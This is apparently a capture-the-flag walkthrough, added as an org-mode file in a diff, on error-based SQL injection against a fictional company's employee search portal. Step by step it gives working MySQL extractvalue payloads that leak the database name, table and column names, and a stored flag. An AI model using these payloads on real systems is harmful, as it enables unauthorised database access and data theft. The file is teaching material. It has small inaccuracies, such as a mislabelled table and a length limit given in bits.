@@ -1,0 +1,136 @@
+#+title: Broken Search
+#+author:analys
+
+* intro
+SecureCorp recently launched the Apache EdgeFlow Platform, a modern web delivery solution designed to help product teams manage and scale their applications efficiently.
+
+Due to an accelerated rollout, the platform was exposed publicly for early testing and feedback.
+
+-----
+
+Error-based SQL Injection is a technique where attackers force the database to generate detailed error messages that reveal sensitive information such as database names, table structures, or query results.
+
+By crafting malicious inputs that break SQL syntax, the application unintentionally exposes internal data through verbose error responses.
+
+Your task is to investigate the exposed service, identify the insecure functionality, and leverage it to gain execution on the system. Once access is obtained, enumerate the environment and recover the sensitive artifact left behind by SecureCorp administrators.
+
+* explore the application
+The application contains an Employee Search Portal where users can search employees by name.
+
+From this behavior backend query might looks like:
+#+begin_src shell
+SELECT id, name, role FROM employees WHERE name = 'Alice'
+#+end_src
+
+Here the user input is directly placed inside the SQL query, which could potentially lead to SQL injection.
+
+* test for sqli
+A common way to test for SQL injection is by entering a single quote.
+#+begin_src shell
+'
+#+end_src
+
+the applications returns --> Error: 1064 (42000): You have an error in your SQL syntax
+
+This tells us two things.
+
+SQL Injection exists and the query likely became:
+#+begin_src shell
+SELECT id, name, role FROM employees WHERE name = '''
+#+end_src
+
+Since the database cannot parse this query, it throws a syntax error. This confirms that user input is directly inserted into the SQL query.
+
+** Identify the Database Type
+The error message contains: 1064 (42000), this is a typical syntax error from MySQL or MariaDB.
+
+Knowing the database type is important because different databases use different system tables and functions.
+
+For MySQL/MariaDB, metadata is stored inside:
+#+begin_src shell
+information_schema
+#+end_src
+
+* leak the database name
+Now we attempt error-based SQL injection.
+
+Error-based SQL injection works by forcing the database to generate an error message that contains the data we want to extract.
+#+begin_src shell
+' AND extractvalue(1,concat(0x7e,database()))-- -
+#+end_src
+
+- database() Returns the current database name.
+- concat(0x7e,database()) Adds a ~ before the result so we can easily identify it in the error.
+- extractvalue() Is a MySQL XML function that throws an error containing the string we pass.
+
+* enum tables
+Now we want to know which tables exist in the database.
+
+MySQL stores table metadata in:
+#+begin_src shell
+information_schema.tables
+#+end_src
+
+payload -->
+#+begin_src shell
+' AND extractvalue(1,concat(0x7e,
+(SELECT table_name
+FROM information_schema.tables
+WHERE table_schema=database()
+LIMIT 1)))-- -
+#+end_src
+
+* enum columns
+Next we want to know what columns exist in the admin_notes table.
+
+Column metadata is stored in:
+#+begin_src shell
+information_schema.columns
+#+end_src
+
+payload -->
+#+begin_src shell
+' AND extractvalue(1,concat(0x7e,
+(SELECT column_name
+FROM information_schema.columns
+WHERE table_name='admin_notes'
+LIMIT 1)))-- -
+#+end_src
+
+next column -->
+#+begin_src shell
+' AND extractvalue(1,concat(0x7e,
+(SELECT column_name
+FROM information_schema.columns
+WHERE table_name='admin_notes'
+LIMIT 1 OFFSET 1)))-- -
+#+end_src
+
+Now we know the table structure:
+#+begin_src shell
+admin(id, note)
+#+end_src
+The flag is likely stored in the note column.
+
+* extract data from the table
+now we attempt to retrieve the value stored inside the note column
+
+payload -->
+#+begin_src shell
+' AND extractvalue(1,concat(0x7e,
+(SELECT note FROM admin_notes LIMIT 1)))-- -
+#+end_src
+
+The output is truncated.
+
+This happens because the error message returned by the database has a limited length. Typically 32 Bit.
+
+* extract the flag in parts
+To bypass the length limit, we extract the data in smaller pieces using substring().
+
+To find part by part:
+#+begin_src shell
+' AND extractvalue(1,concat(0x7e,
+substring((SELECT note FROM admin_notes LIMIT 1),<start>,<stop>)))-- -
+#+end_src
+Experiment with start and stop values to find the full flag.Combining the extracted parts gives the full flag.
